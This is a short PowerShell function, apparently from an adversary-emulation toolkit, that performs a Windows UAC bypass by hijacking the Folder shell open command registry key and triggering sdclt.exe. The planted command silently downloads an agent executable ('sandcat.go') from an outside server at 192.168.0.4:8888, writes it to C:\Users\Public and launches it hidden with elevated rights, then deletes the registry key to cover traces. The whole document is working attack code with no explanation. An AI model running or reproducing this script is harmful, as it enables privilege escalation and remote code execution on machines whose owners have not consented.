function bypass {
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'powershell -exec bypass -Noninteractive -windowstyle hidden $server="http://192.168.0.4:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group bypass-UAC" -WindowStyle hidden;'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
}